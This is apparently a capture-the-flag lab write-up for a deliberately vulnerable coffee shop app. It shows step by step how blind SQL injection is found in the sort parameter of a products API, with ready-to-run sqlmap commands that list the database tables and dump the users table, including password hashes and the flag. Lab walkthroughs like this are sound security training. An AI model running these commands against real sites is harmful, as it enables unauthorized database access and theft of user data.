# Cafe Club — cafeclub-010 — Inject all the things.

## Step 1 — Find the products API

Open Firefox → Developer Tools → Network.

Load the products page.

You should see a request similar to:
```
GET /api/products
```
The API accepts parameters such as search and, importantly, sort.

## Step 2 — Test the sort parameter normally

Send:
```
GET /api/products?sort=price
```
The response should return the products ordered by price:
```json
8.99
19.99
19.99
21.99
22.99
24.99
24.99
26.99
28.99
29.99
34.99
39.99
45.99
49.99
89.99
299.99
``` 
To verify it send:
```
GET /api/products?sort=price DESC
```
The response should return the products ordered by price in descending.

This demonstrates that the server processes the sort parameter. So it's confirmed this is the injection point. Since you've already identified GET /api/products?sort=... as a potentially injectable parameter, let SQLmap do the repetitive differential testing. 

## Step 3 — Run SQLmap against sort

On Kali Linux, run:
```bash
sqlmap -u "https://<YOUR-LAB-HOST>/api/products?sort=price" \
-p sort \
--technique=B \
--level=3 \
--headers="Authorization: Bearer <YOUR_JWT>" \
--dbms=sqlite \
--tables \
--threads=10 \
--no-cast
```
Replace:

<YOUR-LAB-HOST>

with your currently running Cafe Club hostname.

And replace:

<YOUR_JWT>

with your own JWT.

## Step 4 — Wait for SQLmap to test sort

SQLmap eventually reported:

GET parameter 'sort' appears to be
'SQLite AND boolean-based blind
- WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
injectable

It then confirmed:

Parameter: sort (GET)
Type: boolean-based blind

and:

back-end DBMS: SQLite

So at this point you have confirmed SQL injection.

## Step 5 — Enumerate the database tables

You used:

--tables

SQLmap retrieved 12 tables:
```bash
+----------------------+
| cart_items           |
| favorites            |
| gift_cards           |
| order_items          |
| order_status_history |
| orders               |
| password_resets      |
| products             |
| reviews              |
| sqlite_sequence      |
| user_gift_cards      |
| users                |
+----------------------+
```
The important table is:

users

SQLmap's enumeration shows the users table among the database tables.

## Step 6 — Dump the users table

Now run:
```bash
sqlmap -u "https://YOUR-LAB-HOST/api/products?sort=price" \
-p sort \
--technique=B \
--level=3 \
--headers="Authorization: Bearer <YOUR_JWT>" \
--dbms=sqlite \
-T users \
--dump \
--threads=10 \
--no-cast
```
The important options are:

-T users

→ target the users table.

--dump

→ retrieve its contents.

## Step 7 — Look for the admin account

SQLmap identified the table structure as:

CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    full_name TEXT,
    address TEXT,
    phone TEXT,
    points INTEGER DEFAULT 0,
    role TEXT DEFAULT 'user',
    avatar_url TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)

It found 5 users.
```
+----+-------+--------------------+-------------+--------+-------------------------------+
| id | role  | email              | phone       | points | address                       |
+----+-------+--------------------+-------------+--------+-------------------------------+
| 1  | admin | admin@cafeclub.com | +1234567890 | 500    | 123 Coffee Street, Bean City  | 
| 2  | user  | coffee@example.com | +1234567891 | 250    | 456 Espresso Ave, Latte Town  |
| 3  | user  | beans@example.com  | +1234567892 | 150    | 789 Roast Road, Grind Village |
| 4  | user  | brew@example.com   | +1234567893 | 75     | 321 Filter Lane, Drip City    |
| 5  | user  | test@mail.com      | +0123456789 | 0      | qwertyuiop,lkjhgfdsa,zzxcvbnm |
+----+-------+--------------------+-------------+--------+-------------------------------+
+------------------------------------------------+-------------+--------------+------------+---------------------+          password                                         | username    | full_name    | avatar_url | created_at          |+------------------------------------------------+-------------+--------------+------------+---------------------+
bug{9mUN5eYD2RQxdL798agrp1OIlFeiMmMr}            | admin       | Admin User   |            | 2026-10-30 12:16:51 | 95b773a9fc63cc5411e05ecc4ae3acabbff5f53546dc265e | coffeelover | Sarah Coffee |            | 2026-10-30 12:16:51 | af87d94361d6273c35f0e08bcfcf7043f35d37686243ec59 | beanmaster  | John Bean    |            | 2026-10-30 12:16:51 | b56c712a35b045b36a86c07da81f80b3b3aa45154cd36000 | brewista    | Emma Brew    |            | 2026-10-30 12:16:51 | password                                         | test        | Test User    |            | 2026-10-30 12:17:45 |+------------------------------------------------+-------------+--------------+------------+---------------------+ 
```
During the dump, the first row retrieved was:

id:        1
role:      admin
email:     admin@cafeclub.com
phone:     +1234567890
points:    500
address:   123 Coffee Street, Bean City
password:  bug{9mUN5eYD2RQxdL798agrp1OIlFeiMmMr}
username:  admin
full_name: Admin User
created_at:2026-10-30 12:16:51

## Step 8 — Flag

The password field contained the Cafe Club flag:
```bash
bug{9mUN5eYD2RQxdL798agrp1OIlFeiMmMr}
```
The whole attack chain
```
Cafe Club
    ↓
/api/products
    ↓
sort parameter
    ↓
sort=id DESC works
    ↓
SQLmap
    ↓
Boolean-based blind SQL injection
    ↓
SQLite
    ↓
--tables
    ↓
users table
    ↓
-T users --dump
    ↓
admin account
    ↓
password field
    ↓
  FLAG
```
Key lesson: the vulnerable input wasn't the product ID. The useful injection point was the sort query parameter on /api/products.